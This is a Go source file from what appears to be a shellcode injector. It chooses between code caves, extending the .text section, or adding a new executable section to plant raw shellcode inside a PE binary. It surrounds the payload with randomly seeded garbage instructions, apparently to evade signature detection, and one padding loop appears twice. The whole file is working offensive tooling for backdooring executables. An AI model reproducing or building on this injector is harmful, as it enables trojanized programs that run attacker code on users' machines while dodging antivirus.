package injector

import (
	"errors"
	"fmt"
)

const reservedCodeCaves = 16

func (inj *Injector) selectInjectRawMode(shellcode []byte) (string, error) {
	if inj.opts.ForceCodeCaveNS {
		return "", errors.New("code cave with new section mode is not support")
	}
	if inj.opts.ForceExtendTextNS {
		return "", errors.New("extend text with new section mode is not support")
	}
	// record seed for insert garbage instruction
	seed := inj.rand.Int63()
	inj.rand.Seed(seed + 4096)
	inj.igir.Seed(seed + 8192)
	// check will use force mode
	var counter int
	for _, sw := range []bool{
		inj.opts.ForceCodeCave,
		inj.opts.ForceExtendText,
		inj.opts.ForceCreateText,
	} {
		if sw {
			counter++
		}
	}
	if counter > 1 {
		return "", errors.New("set too many force mode in options")
	}
	if counter == 1 {
		return inj.useForceRawMode(shellcode)
	}
	// try to use these modes in the following order
	// 1. CodeCave
	// 2. ExtendText
	// 3. CreateText
	for _, rm := range []func([]byte) (string, error){
		inj.useCodeCaveRawMode,
		inj.useExtendTextRawMode,
		inj.useCreateTextRawMode,
	} {
		mode, err := rm(shellcode)
		if err == nil {
			return mode, nil
		}
	}
	return "", errors.New("unable to select any mode for inject raw")
}

func (inj *Injector) useForceRawMode(shellcode []byte) (string, error) {
	switch {
	case inj.opts.ForceCodeCave:
		return inj.useCodeCaveRawMode(shellcode)
	case inj.opts.ForceExtendText:
		return inj.useExtendTextRawMode(shellcode)
	case inj.opts.ForceCreateText:
		return inj.useCreateTextRawMode(shellcode)
	default:
		panic("unreachable code")
	}
}

func (inj *Injector) useCodeCaveRawMode(shellcode []byte) (string, error) {
	insts, err := inj.disassemble(shellcode)
	if err != nil {
		return "", fmt.Errorf("failed to disassemble shellcode: %s", err)
	}
	var (
		saveContext    [][]byte
		restoreContext [][]byte
	)
	if !inj.opts.NotSaveContext {
		saveContext = inj.saveContext()
		restoreContext = inj.restoreContext()
	}
	num := len(saveContext) + len(restoreContext) + len(insts) + reservedCodeCaves
	if num > len(inj.caves) {
		return "", errors.New("not enough code caves for code cave mode")
	}
	inj.ctx.Mode = ModeCodeCave
	return ModeCodeCave, nil
}

func (inj *Injector) useExtendTextRawMode(shellcode []byte) (string, error) {
	if !inj.canTryExtendText {
		return "", errors.New("the first section without RX")
	}
	// calculate the section extend size
	shellcodeSize := uint32(len(shellcode))           // #nosec G115
	randomBeginSize := uint32(64 + inj.rand.Intn(64)) // #nosec G115
	randomEndSize := uint32(32 + inj.rand.Intn(256))  // #nosec G115
	reservedInstSize := inj.calcReservedCtxInstSize()
	size := uint32(0)
	size += randomBeginSize
	size += reservedInstSize
	size += shellcodeSize
	size += reservedInstSize
	size += randomEndSize
	// extend text and update internal status
	output, extended, err := inj.extendTextSection(size)
	if err != nil {
		return "", err
	}
	err = inj.preprocess(output, inj.opts)
	if err != nil {
		return "", err
	}
	text := inj.img.Sections[0]
	// padding the extended section
	for i := uint32(0); i < extended; i++ {
		inj.dup[text.Offset+i] = 0xCC
	}
	inj.paddingGarbageInst(text.Offset, randomBeginSize+reservedInstSize)
	off := randomBeginSize + reservedInstSize + shellcodeSize
	inj.paddingGarbageInst(text.Offset+off, extended-off)
	// update context
	inj.extendTextSize = extended
	inj.dstRVA = text.VirtualAddress + randomBeginSize
	inj.dstFOA = text.Offset + randomBeginSize
	inj.ctx.Mode = ModeExtendText
	inj.ctx.ExtendedSize = extended
	return ModeExtendText, nil
}

func (inj *Injector) useCreateTextRawMode(shellcode []byte) (string, error) {
	// calculate the section size
	shellcodeSize := uint32(len(shellcode))           // #nosec G115
	randomBeginSize := uint32(64 + inj.rand.Intn(64)) // #nosec G115
	randomEndSize := uint32(32 + inj.rand.Intn(256))  // #nosec G115
	reservedInstSize := inj.calcReservedCtxInstSize()
	size := uint32(0)
	size += randomBeginSize
	size += reservedInstSize
	size += shellcodeSize
	size += reservedInstSize
	size += randomEndSize
	section, err := inj.createSectionRX(inj.opts.SectionName, size)
	if err != nil {
		return "", err
	}
	// padding the created section
	for i := uint32(0); i < section.Size; i++ {
		inj.dup[section.Offset+i] = 0xCC
	}
	// padding the created section
	for i := uint32(0); i < section.Size; i++ {
		inj.dup[section.Offset+i] = 0xCC
	}
	inj.paddingGarbageInst(section.Offset, randomBeginSize+reservedInstSize)
	off := randomBeginSize + reservedInstSize + shellcodeSize
	inj.paddingGarbageInst(section.Offset+off, section.Size-off)
	// update context
	inj.dstRVA = section.VirtualAddress + randomBeginSize
	inj.dstFOA = section.Offset + randomBeginSize
	inj.ctx.Mode = ModeCreateText
	return ModeCreateText, nil
}
